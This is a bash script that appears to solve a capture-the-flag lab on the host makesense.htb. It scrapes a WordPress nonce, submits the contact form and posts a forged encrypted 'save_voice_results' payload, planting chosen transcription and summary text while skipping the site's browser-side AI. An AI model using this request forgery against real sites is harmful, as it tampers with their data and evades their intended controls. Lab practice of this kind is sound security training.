#!/bin/bash
# Bypass browser AI: contact form -> forged encrypted save_voice_results
set -euo pipefail
HOST="${HOST:-https://makesense.htb}"
MSG="${1:-This is my test message without browser AI. It is long enough for the form.}"
SUMMARY="${2:-Controlled summary from CLI.}"
TRANS="${3:-Controlled transcription from CLI.}"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"

NONCE=$(curl -sk "$HOST/" | grep -oP 'nonce":"\K[^"]+')
PID=$(curl -sk -X POST "$HOST/wp-admin/admin-ajax.php" \
  --data-urlencode "action=submit_contact_form" \
  --data-urlencode "nonce=$NONCE" \
  --data-urlencode "name=cli" \
  --data-urlencode "email=cli@local.htb" \
  --data-urlencode "phone=" \
  --data-urlencode "message=$MSG" | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['post_id'])")

ENC=$(python3 "$SCRIPT_DIR/encrypt_payload.py" "$TRANS" "$SUMMARY")
curl -sk -X POST "$HOST/wp-admin/admin-ajax.php" \
  --data-urlencode "action=save_voice_results" \
  --data-urlencode "nonce=$NONCE" \
  --data-urlencode "post_id=$PID" \
  --data-urlencode "encrypted_payload=$ENC" | python3 -m json.tool

echo "post_id=$PID"
echo "REST: $HOST/index.php?rest_route=/wp/v2/contact_submission/$PID"